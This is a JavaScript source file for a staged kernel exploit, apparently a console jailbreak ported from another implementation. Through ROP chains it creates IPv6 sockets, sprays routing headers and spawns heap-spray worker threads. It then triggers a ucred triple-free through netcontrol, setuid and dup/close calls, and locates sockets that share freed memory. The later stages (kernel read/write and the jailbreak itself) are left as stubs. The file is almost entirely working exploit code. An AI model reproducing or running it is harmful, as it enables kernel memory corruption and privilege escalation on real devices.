include('inject.js')
include('globals.js')
include('util.js')

// ============================================================================
// NetControl Kernel Exploit (NetControl port based on TheFl0w's Java impl)
// STAGED IMPLEMENTATION - Only Stage 1 active
// ============================================================================

log('')
log('=== NetControl Kernel Exploit (STAGED) ===')

// Extract required syscalls from syscalls.map
var kapi = {
  read_lo: 0, read_hi: 0, read_found: false,
  write_lo: 0, write_hi: 0, write_found: false,
  close_lo: 0, close_hi: 0, close_found: false,
  setuid_lo: 0, setuid_hi: 0, setuid_found: false,
  dup_lo: 0, dup_hi: 0, dup_found: false,
  socket_lo: 0, socket_hi: 0, socket_found: false,
  setsockopt_lo: 0, setsockopt_hi: 0, setsockopt_found: false,
  getsockopt_lo: 0, getsockopt_hi: 0, getsockopt_found: false,
  netcontrol_lo: 0, netcontrol_hi: 0, netcontrol_found: false
}

// Get syscall addresses from already-scanned syscalls.map
if (syscalls.map.has(0x03)) {
  var addr = syscalls.map.get(0x03)
  kapi.read_lo = addr.lo()
  kapi.read_hi = addr.hi()
  kapi.read_found = true
}
if (syscalls.map.has(0x04)) {
  var addr = syscalls.map.get(0x04)
  kapi.write_lo = addr.lo()
  kapi.write_hi = addr.hi()
  kapi.write_found = true
}
if (syscalls.map.has(0x06)) {
  var addr = syscalls.map.get(0x06)
  kapi.close_lo = addr.lo()
  kapi.close_hi = addr.hi()
  kapi.close_found = true
}
if (syscalls.map.has(0x17)) {
  var addr = syscalls.map.get(0x17)
  kapi.setuid_lo = addr.lo()
  kapi.setuid_hi = addr.hi()
  kapi.setuid_found = true
}
if (syscalls.map.has(0x29)) {
  var addr = syscalls.map.get(0x29)
  kapi.dup_lo = addr.lo()
  kapi.dup_hi = addr.hi()
  kapi.dup_found = true
}
if (syscalls.map.has(0x61)) {
  var addr = syscalls.map.get(0x61)
  kapi.socket_lo = addr.lo()
  kapi.socket_hi = addr.hi()
  kapi.socket_found = true
}
if (syscalls.map.has(0x69)) {
  var addr = syscalls.map.get(0x69)
  kapi.setsockopt_lo = addr.lo()
  kapi.setsockopt_hi = addr.hi()
  kapi.setsockopt_found = true
}
if (syscalls.map.has(0x76)) {
  var addr = syscalls.map.get(0x76)
  kapi.getsockopt_lo = addr.lo()
  kapi.getsockopt_hi = addr.hi()
  kapi.getsockopt_found = true
}
if (syscalls.map.has(0x63)) {
  var addr = syscalls.map.get(0x63)
  kapi.netcontrol_lo = addr.lo()
  kapi.netcontrol_hi = addr.hi()
  kapi.netcontrol_found = true
}

// Check required syscalls
if (!kapi.socket_found || !kapi.setsockopt_found || !kapi.getsockopt_found || !kapi.close_found || !kapi.netcontrol_found) {
  log('ERROR: Required syscalls not found')
  log('  socket: ' + kapi.socket_found)
  log('  setsockopt: ' + kapi.setsockopt_found)
  log('  getsockopt: ' + kapi.getsockopt_found)
  log('  close: ' + kapi.close_found)
  log('  netcontrol: ' + kapi.netcontrol_found)
  log('  setuid: ' + kapi.setuid_found)
  throw new Error('Required syscalls not found')
}

log('All required syscalls found')
log('')

// ============================================================================
// STAGE 1: Setup - Create IPv6 sockets and initialize pktopts
// Based on setup() in netctrl.java (lines 858-892)
// ============================================================================

log('=== STAGE 1: Setup (Socket Creation & Initialization) ===')
log('')

// Pre-allocate all buffers once (reuse throughout exploit)
var store_addr = mem.malloc(0x100)
var rthdr_buf = mem.malloc(UCRED_SIZE)
var optlen_buf = mem.malloc(8)

// Storage for IPv6 sockets
var ipv6_sockets = new Int32Array(IPV6_SOCK_NUM)
var socket_count = 0

// Build socket() ROP chain once (reuse for all sockets)
var socket_wrapper = new BigInt(kapi.socket_hi, kapi.socket_lo)
var socket_insts = build_rop_chain(
  socket_wrapper,
  new BigInt(0, AF_INET6),
  new BigInt(0, SOCK_STREAM),
  new BigInt(0, 0)
)
rop.store(socket_insts, store_addr, 1)

log('[STAGE1] Creating ' + IPV6_SOCK_NUM + ' IPv6 sockets...')

// Create IPv6 sockets (reuse same ROP chain and store_addr)
for (var i = 0; i < IPV6_SOCK_NUM; i++) {
  rop.execute(socket_insts, store_addr, 0x10)
  var fd = mem.read8(store_addr.add(new BigInt(0, 8)))

  if (fd.hi() === 0xFFFFFFFF) {
    log('[STAGE1] ERROR: socket() failed at index ' + i)
    log('[STAGE1] Return value: ' + fd.toString())
    break
  }

  ipv6_sockets[i] = fd.lo()
  socket_count++

  if ((i + 1) % 32 === 0 || i === 0) {
    log('[STAGE1] Created socket ' + (i + 1) + '/' + IPV6_SOCK_NUM + ' (fd=' + fd.lo() + ')')
  }
}

log('[STAGE1] Socket creation complete: ' + socket_count + '/' + IPV6_SOCK_NUM)

if (socket_count !== IPV6_SOCK_NUM) {
  log('[STAGE1] FAILED: Not all sockets created')
  throw new Error('Failed to create all sockets')
}

log('')
log('[STAGE1] Initializing pktopts on all sockets...')

// Build setsockopt(fd, IPPROTO_IPV6, IPV6_RTHDR, NULL, 0) ROP chain template
var init_wrapper = new BigInt(kapi.setsockopt_hi, kapi.setsockopt_lo)

// Initialize pktopts by calling setsockopt with NULL buffer
var init_count = 0
for (var i = 0; i < IPV6_SOCK_NUM; i++) {
  var init_insts = build_rop_chain(
    init_wrapper,
    new BigInt(0, ipv6_sockets[i]),
    new BigInt(0, IPPROTO_IPV6),
    new BigInt(0, IPV6_RTHDR),
    new BigInt(0, 0), // NULL buffer
    new BigInt(0, 0)  // size 0
  )
  rop.store(init_insts, store_addr, 1)
  rop.execute(init_insts, store_addr, 0x10)
  var ret = mem.read8(store_addr.add(new BigInt(0, 8)))

  if (ret.hi() !== 0xFFFFFFFF || ret.lo() !== 0xFFFFFFFF) {
    init_count++
  }

  if ((i + 1) % 32 === 0 || i === 0) {
    log('[STAGE1] Initialized socket ' + (i + 1) + '/' + IPV6_SOCK_NUM + ' (ret=' + ret.lo() + ')')
  }
}

log('[STAGE1] Initialization complete: ' + init_count + '/' + IPV6_SOCK_NUM + ' pktopts initialized')

if (init_count === 0) {
  log('[STAGE1] FAILED: No pktopts initialized')
  throw new Error('Failed to initialize pktopts')
}

log('')
log('=== STAGE 1 COMPLETE ===')
log('')

// ============================================================================
// STAGE 2: Spray routing headers
// Based on buildRthdr() and spray loop in netctrl.java (lines 322-329, 359-362)
// ============================================================================

log('=== STAGE 2: Spray Routing Headers ===')
log('')

// Build IPv6 routing header template
// Header structure: ip6r_nxt (1 byte), ip6r_len (1 byte), ip6r_type (1 byte), ip6r_segleft (1 byte)
var rthdr_len = ((UCRED_SIZE >> 3) - 1) & ~1
mem.write1(rthdr_buf, 0) // ip6r_nxt
mem.write1(rthdr_buf.add(new BigInt(0, 1)), rthdr_len) // ip6r_len
mem.write1(rthdr_buf.add(new BigInt(0, 2)), IPV6_RTHDR_TYPE_0) // ip6r_type
mem.write1(rthdr_buf.add(new BigInt(0, 3)), rthdr_len >> 1) // ip6r_segleft
var rthdr_size = (rthdr_len + 1) << 3

log('[STAGE2] Built routing header template (size=' + rthdr_size + ' bytes)')

// Spray routing headers with tagged values across all sockets
log('[STAGE2] Spraying routing headers across ' + IPV6_SOCK_NUM + ' sockets...')

var setsockopt_wrapper = new BigInt(kapi.setsockopt_hi, kapi.setsockopt_lo)

for (var i = 0; i < IPV6_SOCK_NUM; i++) {
  // Write unique tag at offset 0x04 (RTHDR_TAG | socket_index)
  mem.write4(rthdr_buf.add(new BigInt(0, 4)), RTHDR_TAG | i)

  // Call setsockopt(fd, IPPROTO_IPV6, IPV6_RTHDR, rthdr_buf, rthdr_size)
  var spray_insts = build_rop_chain(
    setsockopt_wrapper,
    new BigInt(0, ipv6_sockets[i]),
    new BigInt(0, IPPROTO_IPV6),
    new BigInt(0, IPV6_RTHDR),
    rthdr_buf,
    new BigInt(0, rthdr_size)
  )
  rop.store(spray_insts, store_addr, 1)
  rop.execute(spray_insts, store_addr, 0x10)

  if ((i + 1) % 32 === 0 || i === 0) {
    log('[STAGE2] Sprayed routing header ' + (i + 1) + '/' + IPV6_SOCK_NUM)
  }
}

log('[STAGE2] Spray complete: ' + IPV6_SOCK_NUM + ' routing headers installed')
log('')
log('=== STAGE 2 COMPLETE ===')
log('')

// ============================================================================
// STAGE 3: Trigger ucred triple-free and find twins/triplet
// Based on triggerUcredTripleFree(), findTwins(), findTriplet() in netctrl.java
// Uses pthread workers for heap spray racing during UAF window
// ============================================================================

log('=== STAGE 3: Trigger Triple-Free & Find Twins/Triplet ===')
log('')

// Get pthread functions from libc (real function addresses)
var pthread_create_addr = libc_addr.add(new BigInt(0, PTHREAD_CREATE_OFFSET))
var pthread_exit_addr = libc_addr.add(new BigInt(0, PTHREAD_EXIT_OFFSET))

log('[STAGE3] pthread_create at: ' + pthread_create_addr.toString())
log('[STAGE3] pthread_exit at: ' + pthread_exit_addr.toString())

// Allocate buffers for netcontrol and getsockopt
var set_buf = mem.malloc(8)
var clear_buf = mem.malloc(8)
var leak_rthdr_buf = mem.malloc(UCRED_SIZE)
var leak_len_buf = mem.malloc(8)

// Global variables for twins and triplet
var twins = [-1, -1]
var triplets = [-1, -1, -1]
var uaf_sock = -1

log('[STAGE3] Step 1: Trigger initial ucred triple-free with IOV spray workers')
log('')

// Create IOV spray worker threads for heap feng shui
log('[STAGE3] Spawning ' + NUM_WORKER_THREADS + ' IOV spray worker threads...')

var setsockopt_wrapper = new BigInt(kapi.setsockopt_hi, kapi.setsockopt_lo)
var worker_threads = []

for (var w = 0; w < NUM_WORKER_THREADS; w++) {
  var worker_rop = mem.malloc(0x2000)
  var worker_rop_arr = []

  // Each worker sprays routing headers on subset of sockets
  var start_sock = Math.floor(w * (IPV6_SOCK_NUM / NUM_WORKER_THREADS))
  var end_sock = Math.floor((w + 1) * (IPV6_SOCK_NUM / NUM_WORKER_THREADS))

  for (var i = start_sock; i < end_sock; i++) {
    // setsockopt(socket, IPPROTO_IPV6, IPV6_RTHDR, rthdr_buf, rthdr_size)
    worker_rop_arr.push(gadgets.POP_RDI_RET)
    worker_rop_arr.push(new BigInt(0, ipv6_sockets[i]))
    worker_rop_arr.push(gadgets.POP_RSI_RET)
    worker_rop_arr.push(new BigInt(0, IPPROTO_IPV6))
    worker_rop_arr.push(gadgets.POP_RDX_RET)
    worker_rop_arr.push(new BigInt(0, IPV6_RTHDR))
    worker_rop_arr.push(gadgets.POP_RCX_RET)
    worker_rop_arr.push(rthdr_buf)
    worker_rop_arr.push(gadgets.POP_R8_RET)
    worker_rop_arr.push(new BigInt(0, rthdr_size))
    worker_rop_arr.push(setsockopt_wrapper)
  }

  // pthread_exit(0)
  worker_rop_arr.push(gadgets.POP_RDI_RET)
  worker_rop_arr.push(new BigInt(0, 0))
  worker_rop_arr.push(pthread_exit_addr)

  // Write ROP chain to worker buffer
  for (var r = 0; r < worker_rop_arr.length; r++) {
    mem.write8(worker_rop.add(new BigInt(0, r * 8)), worker_rop_arr[r])
  }

  // Setup worker function pointer (points to ROP via RET gadget)
  var worker_func = mem.malloc(0x10)
  mem.write8(worker_func, gadgets.RET)
  mem.write8(worker_func.add(new BigInt(0, 8)), worker_rop)

  // Allocate pthread_t storage
  var pthread_addr = mem.malloc(8)

  // Allocate thread name string ("iov_worker_N")
  var thread_name = mem.malloc(16)
  mem.write1(thread_name.add(new BigInt(0, 0)), 0x69)  // 'i'
  mem.write1(thread_name.add(new BigInt(0, 1)), 0x6F)  // 'o'
  mem.write1(thread_name.add(new BigInt(0, 2)), 0x76)  // 'v'
  mem.write1(thread_name.add(new BigInt(0, 3)), 0x5F)  // '_'
  mem.write1(thread_name.add(new BigInt(0, 4)), 0x77)  // 'w'
  mem.write1(thread_name.add(new BigInt(0, 5)), 0x6B)  // 'k'
  mem.write1(thread_name.add(new BigInt(0, 6)), 0x72)  // 'r'
  mem.write1(thread_name.add(new BigInt(0, 7)), 0x5F)  // '_'
  mem.write1(thread_name.add(new BigInt(0, 8)), 0x30 + w)  // '0'-'3'
  mem.write1(thread_name.add(new BigInt(0, 9)), 0)  // null terminator

  // scePthreadCreate(thread, attr, start_routine, arg, name)
  var pthread_store = mem.malloc(0x100)
  var pthread_insts = build_rop_chain(
    pthread_create_addr,
    pthread_addr,
    new BigInt(0, 0), // attr = NULL
    worker_func,
    new BigInt(0, 0), // arg = NULL
    thread_name       // thread name
  )
  rop.store(pthread_insts, pthread_store, 1)
  rop.execute(pthread_insts, pthread_store, 0x10)
  mem.free(pthread_store)

  var pthread_id = mem.read8(pthread_addr)
  worker_threads.push(pthread_id)

  if ((w + 1) % 2 === 0 || w === 0) {
    log('[STAGE3] Worker ' + (w + 1) + '/' + NUM_WORKER_THREADS + ' spawned (pthread=' + pthread_id.toString() + ')')
  }
}

log('[STAGE3] All worker threads spawned, racing heap spray...')
log('')
log('[STAGE3] Step 2: Trigger ucred triple-free sequence')

// Create dummy socket to register with netcontrol
var socket_wrapper = new BigInt(kapi.socket_hi, kapi.socket_lo)
var dummy_sock_insts = build_rop_chain(
  socket_wrapper,
  new BigInt(0, AF_UNIX),
  new BigInt(0, SOCK_STREAM),
  new BigInt(0, 0)
)
rop.store(dummy_sock_insts, store_addr, 1)
rop.execute(dummy_sock_insts, store_addr, 0x10)
var dummy_sock = mem.read8(store_addr.add(new BigInt(0, 8))).lo()

log('[STAGE3] Created dummy socket: fd=' + dummy_sock)

// Register dummy socket with netcontrol
mem.write4(set_buf, dummy_sock)
var netcontrol_wrapper = new BigInt(kapi.netcontrol_hi, kapi.netcontrol_lo)
var set_insts = build_rop_chain(
  netcontrol_wrapper,
  new BigInt(0xFFFFFFFF, 0xFFFFFFFF), // -1
  new BigInt(0, NET_CONTROL_NETEVENT_SET_QUEUE),
  set_buf,
  new BigInt(0, 8)
)
rop.store(set_insts, store_addr, 1)
rop.execute(set_insts, store_addr, 0x10)

log('[STAGE3] Registered dummy socket with netcontrol')

// Close dummy socket
var close_wrapper = new BigInt(kapi.close_hi, kapi.close_lo)
var close_insts = build_rop_chain(
  close_wrapper,
  new BigInt(0, dummy_sock)
)
rop.store(close_insts, store_addr, 1)
rop.execute(close_insts, store_addr, 0x10)

log('[STAGE3] Closed dummy socket')

// Allocate new ucred via setuid
var setuid_wrapper = new BigInt(kapi.setuid_hi, kapi.setuid_lo)
var setuid_insts = build_rop_chain(
  setuid_wrapper,
  new BigInt(0, 1)
)
rop.store(setuid_insts, store_addr, 1)
rop.execute(setuid_insts, store_addr, 0x10)

log('[STAGE3] Allocated ucred via setuid(1)')

// Reclaim file descriptor with new socket
rop.execute(dummy_sock_insts, store_addr, 0x10)
uaf_sock = mem.read8(store_addr.add(new BigInt(0, 8))).lo()

log('[STAGE3] Reclaimed fd with UAF socket: fd=' + uaf_sock)

// Free previous ucred via setuid again
rop.execute(setuid_insts, store_addr, 0x10)

log('[STAGE3] Freed ucred via setuid(1)')

// Unregister and trigger final free
mem.write4(clear_buf, uaf_sock)
var clear_insts = build_rop_chain(
  netcontrol_wrapper,
  new BigInt(0xFFFFFFFF, 0xFFFFFFFF), // -1
  new BigInt(0, NET_CONTROL_NETEVENT_CLEAR_QUEUE),
  clear_buf,
  new BigInt(0, 8)
)
rop.store(clear_insts, store_addr, 1)
rop.execute(clear_insts, store_addr, 0x10)

log('[STAGE3] Unregistered socket (triple-free triggered)')
log('')

// Wait for worker threads to complete spray race
log('[STAGE3] Waiting for workers to complete heap spray race...')
for (var delay = 0; delay < 100000; delay++) {
  // Busy wait for workers
}
log('[STAGE3] Workers completed')
log('')

// Double free ucred (only dup works - doesn't check f_hold)
var dup_wrapper = new BigInt(kapi.dup_hi, kapi.dup_lo)
var dup_insts = build_rop_chain(
  dup_wrapper,
  new BigInt(0, uaf_sock)
)
rop.store(dup_insts, store_addr, 1)
rop.execute(dup_insts, store_addr, 0x10)
var dup_fd = mem.read8(store_addr.add(new BigInt(0, 8))).lo()

var close_dup_insts = build_rop_chain(
  close_wrapper,
  new BigInt(0, dup_fd)
)
rop.store(close_dup_insts, store_addr, 1)
rop.execute(close_dup_insts, store_addr, 0x10)

log('[STAGE3] Double freed ucred via close(dup(uaf_sock))')
log('')

// Find twins - two sockets sharing same routing header
log('[STAGE3] Step 3: Finding twins (sockets sharing same rthdr)...')

var getsockopt_wrapper = new BigInt(kapi.getsockopt_hi, kapi.getsockopt_lo)
var found_twins = false

// Check for twins (workers already sprayed tags)
for (var i = 0; i < IPV6_SOCK_NUM; i++) {
  mem.write8(leak_len_buf, new BigInt(0, UCRED_SIZE))

  var get_insts = build_rop_chain(
    getsockopt_wrapper,
    new BigInt(0, ipv6_sockets[i]),
    new BigInt(0, IPPROTO_IPV6),
    new BigInt(0, IPV6_RTHDR),
    leak_rthdr_buf,
    leak_len_buf
  )
  rop.store(get_insts, store_addr, 1)
  rop.execute(get_insts, store_addr, 0x10)

  var val = mem.read4(leak_rthdr_buf.add(new BigInt(0, 4)))
  var j = val & 0xFFFF

  if ((val & 0xFFFF0000) === RTHDR_TAG && i !== j) {
    twins[0] = i
    twins[1] = j
    found_twins = true
    log('[STAGE3] Found twins: socket[' + i + '] and socket[' + j + '] share rthdr')
    break
  }

  if ((i + 1) % 32 === 0) {
    log('[STAGE3] Checked ' + (i + 1) + '/' + IPV6_SOCK_NUM + ' sockets...')
  }
}

if (!found_twins) {
  log('[STAGE3] FAILED: Could not find twins')
  throw new Error('Failed to find twins - UAF may have failed')
}

log('')
log('=== STAGE 3 COMPLETE ===')
log('')
log('[INFO] Ucred triple-free triggered with ' + NUM_WORKER_THREADS + ' pthread workers')
log('[INFO] Found twins: socket[' + twins[0] + '] and socket[' + twins[1] + ']')
log('[INFO] Workers raced heap spray during UAF window')
log('')
log('[NEXT] Stage 4 will leak kqueue structure')
log('[NEXT] Stage 5 will build kernel R/W primitives')
log('[NEXT] Stage 6 will jailbreak the system')
log('')
log('=== Exploit stopped at Stage 3 for testing ===')

// Cleanup buffers
mem.free(store_addr)
mem.free(rthdr_buf)
mem.free(optlen_buf)
mem.free(set_buf)
mem.free(clear_buf)
mem.free(leak_rthdr_buf)
mem.free(leak_len_buf)

// ============================================================================
// STAGE 4: Leak kqueue structure (DISABLED)
// ============================================================================
// Will be implemented in next iteration

// ============================================================================
// STAGE 5: Kernel R/W primitives via pipe corruption (DISABLED)
// ============================================================================
// Will be implemented in next iteration

// ============================================================================
// STAGE 6: Jailbreak (DISABLED)
// ============================================================================
// Will be implemented in next iteration
